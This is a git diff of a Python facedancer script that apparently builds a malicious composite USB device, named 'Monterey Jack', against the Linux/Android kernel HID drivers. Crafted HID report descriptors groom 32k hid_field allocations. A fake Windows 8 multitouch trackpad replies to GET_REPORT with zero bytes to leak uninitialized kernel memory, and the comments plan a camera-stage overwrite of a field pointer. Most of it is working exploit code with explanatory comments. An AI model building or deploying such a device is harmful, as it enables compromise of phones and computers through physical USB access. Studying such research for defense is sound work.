@@ -10,12 +10,30 @@ from facedancer.classes import *
 from facedancer.classes.hid.usage import *
 from facedancer.classes.hid.descriptor import *
 
-# 3 set of devices:
-# initial HID device - allocates 3x16k hid fields, then disconnects
-# Wacom leak device - leak a 16k feature report, allocate a 16k field 3x until we leak the three fields, then disconnects
-# USB HID + webcam device - allocates 3x16k hid fields, overwrite a field's length
+"""
+A composite device:
+- HID:
+ - allocate 32k fields C, B, A, error out
+   - freelist: A, B, C
+- HID (multitouch):
+ - dump A
+ - freelist: A, B, C
+- HID (multitouch):
+ - allocate field A
+ - dump B
+ - freelist: B, C
+- HID (multitouch):
+ - allocate field B
+ - dump C
+ - freelist: C
+- HID:
+ - allocate field C
+ - fields for a standard keyboard
+- camera
+ - overwrite C to point to B
+"""
 
-# allocate 16k hid_fields A, B, C
+# allocate 32k hid_fields A, B, C
 
 @use_inner_classes_automatically
 class InitialHIDReportDescriptor(HIDReportDescriptor):
@@ -26,9 +44,8 @@ class InitialHIDReportDescriptor(HIDReportDescriptor):
         USAGE_PAGE       (HIDUsagePage.KEYBOARD),
 
         # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-core.c;l=126;drc=c600a55922640b1c4dcfdc5a694cadd2dd9d1599
-        # 8204 bytes
         USAGE_MINIMUM    (0),
-        USAGE_MAXIMUM    (0x20, 0x01),
+        USAGE_MAXIMUM    (0x00, 0x02),
         LOGICAL_MINIMUM (0),
         LOGICAL_MAXIMUM (0),
         REPORT_SIZE      (32),
@@ -36,31 +53,113 @@ class InitialHIDReportDescriptor(HIDReportDescriptor):
         INPUT            (variable=True),
 
         USAGE_MINIMUM    (0),
-        USAGE_MAXIMUM    (0x20, 0x01),
+        USAGE_MAXIMUM    (0x00, 0x02),
         LOGICAL_MINIMUM (0),
         LOGICAL_MAXIMUM (0),
         REPORT_SIZE      (32),
         REPORT_COUNT     (1),
         INPUT            (variable=True),
 
-        USAGE_PAGE       (HIDUsagePage.LEDS),
         USAGE_MINIMUM    (0),
-        USAGE_MAXIMUM    (0x20, 0x01),
+        USAGE_MAXIMUM    (0x00, 0x02),
         LOGICAL_MINIMUM (0),
         LOGICAL_MAXIMUM (0),
         REPORT_SIZE      (32),
         REPORT_COUNT     (1),
-        OUTPUT            (variable=True),
+        INPUT            (variable=True),
+
+        # intentionally error out
+        # END_COLLECTION   (),
+    )
+
+HID_USAGE_DIGITIZER_PEN = 0x0002
+HID_USAGE_DIGITIZER_CONTACTID = 0x51
+HID_USAGE_DIGITIZER_INPUTMODE = 0x52
+HID_USAGE_VENDOR_DEFINED_WIN8_THQA_BLOB = 0xc5
+
+@use_inner_classes_automatically
+class MultitouchInputReportDescriptor(HIDReportDescriptor):
+    fields : tuple = (
+        USAGE_PAGE       (HIDUsagePage.DIGITIZER),
+        USAGE            (HID_USAGE_DIGITIZER_PEN),
+        COLLECTION       (HIDCollection.APPLICATION),
+
+        USAGE (HID_USAGE_DIGITIZER_CONTACTID),
+        LOGICAL_MINIMUM (0),
+        LOGICAL_MAXIMUM (0),
+        REPORT_SIZE      (32),
+        REPORT_COUNT     (1),
+        INPUT            (variable=True),
+
+        # thanks to xyzz for figuring this out.
+        # hid-multitouch's mt_feature_mapping gets feature reports if it sees certain usages - for Win8 trackpads on 4.9 and below, for everything on 4.10 and above
+        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=493;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
+        # It allocates a buffer with hid_alloc_report_buf and calls GET_REPORT:
+        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=474;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
+        # the GET_REPORT can return a report that's too short, but the call to hid_hw_raw_request incorrectly uses the original length allocated:
+        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=1515;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
+        # This will cause values to be read from the uninitialized memory.
+        # we simulate a Windows 8 trackpad to trigger this on 4.9. (You can probably support down to 4.4 by using both this alongside HID_DG_CONTACTMAX)
+        USAGE_PAGE       (0x00, 0xff), # vendor defined
+        USAGE (HID_USAGE_VENDOR_DEFINED_WIN8_THQA_BLOB),
+        LOGICAL_MINIMUM (0),
+        LOGICAL_MAXIMUM (0),
+        REPORT_SIZE      (8),
+        REPORT_COUNT     (0x00, 0x01),
+        FEATURE            (variable=True),
+
+        # we force hid-multitouch to send a SET_REPORT back out by including a HID_USAGE_DIGITIZER_INPUTMODE:
+        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=1515;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
+        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=1602;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
+        USAGE_PAGE       (HIDUsagePage.DIGITIZER),
+        USAGE (HID_USAGE_DIGITIZER_INPUTMODE),
+        LOGICAL_MINIMUM (0),
+        LOGICAL_MAXIMUM (0),
+        REPORT_SIZE      (8),
+        REPORT_COUNT     (1),
+        FEATURE            (variable=True),
+
+        # we want this to allocate a 32k buffer
+        REPORT_SIZE      (8),
+        REPORT_COUNT     (0x00, 0x20),
+        FEATURE            (constant=True),
+        # 0x4000 (max size) - 0x2000 - 0x100 - 0x1 - 0x1 to just fall below the 16K HID buffer limit; it'll be rounded up
+        REPORT_SIZE      (8),
+        REPORT_COUNT     (0xfe, 0x1e),
+        FEATURE            (constant=True),
 
         END_COLLECTION   (),
     )
+    
+@use_inner_classes_automatically
+class MultitouchWith32KInputReportDescriptor(HIDReportDescriptor):
+    fields : tuple = (
+        USAGE_PAGE       (HIDUsagePage.DIGITIZER),
+        USAGE            (HID_USAGE_DIGITIZER_PEN),
+        COLLECTION       (HIDCollection.APPLICATION),
+
+        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-core.c;l=126;drc=c600a55922640b1c4dcfdc5a694cadd2dd9d1599
+        USAGE_MINIMUM    (0),
+        USAGE_MAXIMUM    (0x00, 0x02),
+        LOGICAL_MINIMUM (0),
+        LOGICAL_MAXIMUM (0),
+        REPORT_SIZE      (32),
+        REPORT_COUNT     (1),
+        INPUT            (variable=True),
+
+        END_COLLECTION   (),
+    )
+
+HID_REQ_GET_REPORT = 0x1
+HID_REQ_SET_REPORT = 0x9
+HID_REQ_SET_IDLE = 0xa
 
 @use_inner_classes_automatically
 class InitialHIDUSBDevice(USBDevice):
     vendor_id: int = 0x1337
     product_id: int = 0xbeef
     class KeyboardConfiguration(USBConfiguration):
-        class KeyboardInterface(USBInterface):
+        class MultitouchDumpAInterface(USBInterface):
             class_number : int = USBDeviceClass.HID
             class KeyEventEndpoint(USBEndpoint):
                 number        : int             = 3
@@ -69,78 +168,31 @@ class InitialHIDUSBDevice(USBDevice):
                 interval      : int             = 10
             class USBClassDescriptor(USBClassDescriptor):
                 number      : int   =  USBDescriptorTypeNumber.HID
-                raw         : bytes = b'\x09\x21\x10\x01\x00\x01\x22' + struct.pack("<H", len(InitialHIDReportDescriptor()()))
-            class ReportDescriptor(InitialHIDReportDescriptor):
+                raw         : bytes = b'\x09\x21\x10\x01\x00\x01\x22' + struct.pack("<H", len(MultitouchInputReportDescriptor()()))
+            class ReportDescriptor(MultitouchInputReportDescriptor):
                 pass
 
-            @class_request_handler(number=USBStandardRequests.GET_INTERFACE)
+            @class_request_handler(number=HID_REQ_SET_IDLE)
             @to_this_interface
             def handle_get_interface_request(self, request):
-                # Silently stall GET_INTERFACE class requests.
+                # Silently stall HID_REQ_SET_IDLE class requests.
                 request.stall()
 
-async def run_monterey_jack():
-    logging.info("Beginning Monterey Jack...")
-
-# main(InitialHIDUSBDevice, run_monterey_jack())
-
-# after this, the hid_fields are freed back to the page allocator: the new free FIFO is C, B, A
-
-HID_USAGE_DIGITIZER_PEN = 0x0002
-HID_USAGE_DIGITIZER_CONTACTID = 0x51
-
-@use_inner_classes_automatically
-class WacomHIDReportDescriptor(HIDReportDescriptor):
-    fields : tuple = (
-        USAGE_PAGE       (HIDUsagePage.DIGITIZER),
-        USAGE            (HID_USAGE_DIGITIZER_PEN),
-        COLLECTION       (HIDCollection.APPLICATION),
-
-        # This report is allocated with hid_alloc_report_buf and will leak uninitialized memory.
-        # thanks to xyzz for figuring this out.
-        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/wacom_sys.c;l=2476;drc=87beb148038d477fb72113e6ae121a37adc3af5e
-        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/wacom_sys.c;l=709;drc=87beb148038d477fb72113e6ae121a37adc3af5e
-        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/wacom_sys.c;l=598;drc=87beb148038d477fb72113e6ae121a37adc3af5e
-        REPORT_ID (2),
-        REPORT_SIZE      (8),
-        REPORT_COUNT     (0x00, 0x20),
-        FEATURE            (constant=True),
-        END_COLLECTION   (),
-    )
-
-HID_REQ_SET_REPORT = 0x9
-
-@use_inner_classes_automatically
-class WacomHIDUSBDevice(USBDevice):
-    vendor_id: int = 0x056a
-    product_id: int = 0x00d0 # BAMBOO_TOUCH
-    class KeyboardConfiguration(USBConfiguration):
-        class KeyboardInterface(USBInterface):
-            class_number : int = USBDeviceClass.HID
-            class KeyEventEndpoint(USBEndpoint):
-                number        : int             = 3
-                direction     : USBDirection    = USBDirection.IN
-                transfer_type : USBTransferType = USBTransferType.INTERRUPT
-                interval      : int             = 10
-            class USBClassDescriptor(USBClassDescriptor):
-                number      : int   =  USBDescriptorTypeNumber.HID
-                raw         : bytes = b'\x09\x21\x10\x01\x00\x01\x22' + struct.pack("<H", len(WacomHIDReportDescriptor()()))
-            class ReportDescriptor(WacomHIDReportDescriptor):
-                pass
-            # actually HID_REQ_SET_IDLE...
-            @class_request_handler(number=USBStandardRequests.GET_INTERFACE)
+            @class_request_handler(number=HID_REQ_GET_REPORT)
             @to_this_interface
-            def handle_get_interface_request(self, request):
-                # Silently stall GET_INTERFACE class requests.
-                request.stall()
+            def handle_hid_get_report(self, request: USBControlRequest):
+                # return 0 bytes - the rest of the report will be read from uninitialized memory
+                request.reply(bytes([]))
 
             @class_request_handler(number=HID_REQ_SET_REPORT)
             @to_this_interface
             def handle_hid_set_report(self, request: USBControlRequest):
-                print(request)
-                print(request.data)
-                outdata = bytearray(4096)
+                # we only bother to leak 256 bytes - good enough...
+                outdata = bytearray(256)
                 request.reply(outdata)
                 print(outdata)
 
-main(WacomHIDUSBDevice, run_monterey_jack())
+async def run_monterey_jack():
+    logging.info("Beginning Monterey Jack...")
+
+main(InitialHIDUSBDevice, run_monterey_jack())
